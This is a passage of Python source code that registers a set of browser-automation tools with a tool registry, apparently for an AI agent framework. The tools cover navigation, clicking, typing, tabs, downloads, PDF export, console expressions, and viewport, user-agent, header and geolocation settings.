    lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
)
registry.register_tool("browser_snapshot", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_snapshot"))(
    lambda args, **kw: browser_snapshot(full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
)
registry.register_tool("browser_click", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_click"))(
    lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
)
registry.register_tool("browser_type", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_type"))(
    lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
)
registry.register_tool("browser_scroll", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_scroll"))(
    lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
)
registry.register_tool("browser_back", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_back"))(
    lambda _args, **kw: browser_back(task_id=kw.get("task_id")),
)
registry.register_tool("browser_press", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_press"))(
    lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
)

registry.register_tool("browser_get_images", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_get_images"))(
    lambda _args, **kw: browser_get_images(task_id=kw.get("task_id")),
)
registry.register_tool("browser_vision", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_vision"))(
    lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
)
registry.register_tool("browser_console", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_console"))(
    lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
)
registry.register_tool("browser_hover", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_hover"))(
    lambda args, **kw: browser_hover(ref=args.get("ref", ""), task_id=kw.get("task_id")),
)
registry.register_tool("browser_wait_for", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_wait_for"))(
    lambda args, **kw: browser_wait_for(
        selector=args.get("selector"),
        text=args.get("text"),
        timeout_s=args.get("timeout_s", 10.0),
        return_snapshot=args.get("return_snapshot", True),
        task_id=kw.get("task_id"),
    ),
)
registry.register_tool("browser_find", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_find"))(
    lambda args, **kw: browser_find(query=args.get("query", ""), ref_only=args.get("ref_only", True), task_id=kw.get("task_id")),
)
registry.register_tool("browser_drag", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_drag"))(
    lambda args, **kw: browser_drag(from_ref=args.get("from_ref", ""), to_ref=args.get("to_ref", ""), hold_key=args.get("hold_key"), task_id=kw.get("task_id")),
)
registry.register_tool("browser_select", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_select"))(
    lambda args, **kw: browser_select(
        ref=args.get("ref", ""),
        value=args.get("value"),
        label=args.get("label"),
        index=args.get("index"),
        open_delay_s=args.get("open_delay_s", 0.5),
        task_id=kw.get("task_id"),
    ),
)
registry.register_tool("browser_download", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_download"))(
    lambda args, **kw: browser_download(ref_or_url=args.get("ref_or_url", ""), save_as=args.get("save_as"), timeout_s=args.get("timeout_s", 30.0), task_id=kw.get("task_id")),
)
registry.register_tool("browser_pdf", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_pdf"))(
    lambda args, **kw: browser_pdf(
        save_as=args.get("save_as"),
        landscape=args.get("landscape", False),
        print_background=args.get("print_background", True),
        paper_width=args.get("paper_width", 8.5),
        paper_height=args.get("paper_height", 11.0),
        task_id=kw.get("task_id"),
    ),
)
registry.register_tool("browser_screenshot_element", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_screenshot_element"))(
    lambda args, **kw: browser_screenshot_element(ref=args.get("ref", ""), save_as=args.get("save_as"), task_id=kw.get("task_id")),
)
registry.register_tool("browser_tab_new", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_tab_new"))(
    lambda args, **kw: browser_tab_new(url=args.get("url"), task_id=kw.get("task_id")),
)
registry.register_tool("browser_tab_switch", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_tab_switch"))(
    lambda args, **kw: browser_tab_switch(tab_id=args.get("tab_id", ""), task_id=kw.get("task_id")),
)
registry.register_tool("browser_tab_close", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_tab_close"))(
    lambda args, **kw: browser_tab_close(tab_id=args.get("tab_id"), task_id=kw.get("task_id")),
)
registry.register_tool("browser_tab_list", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_tab_list"))(
    lambda _args, **kw: browser_tab_list(task_id=kw.get("task_id")),
)
registry.register_tool("browser_set_viewport", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_set_viewport"))(
    lambda args, **kw: browser_set_viewport(
        width=args.get("width", 1280),
        height=args.get("height", 720),
        device_scale_factor=args.get("device_scale_factor", 1.0),
        mobile=args.get("mobile", False),
        task_id=kw.get("task_id"),
    ),
)
registry.register_tool("browser_set_user_agent", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_set_user_agent"))(
    lambda args, **kw: browser_set_user_agent(
        user_agent=args.get("user_agent"),
        platform=args.get("platform"),
        accept_language=args.get("accept_language"),
        task_id=kw.get("task_id"),
    ),
)
registry.register_tool("browser_set_extra_headers", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_set_extra_headers"))(
    lambda args, **kw: browser_set_extra_headers(headers=args.get("headers", {}), task_id=kw.get("task_id")),
)
registry.register_tool("browser_set_geolocation", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_set_geolocation"))(
    lambda args, **kw: browser_set_geolocation(lat=args.get("lat", 0.0), lon=args.get("lon", 0.0), accuracy=args.get("accuracy", 100.0), task_id=kw.get("task_id")),
)
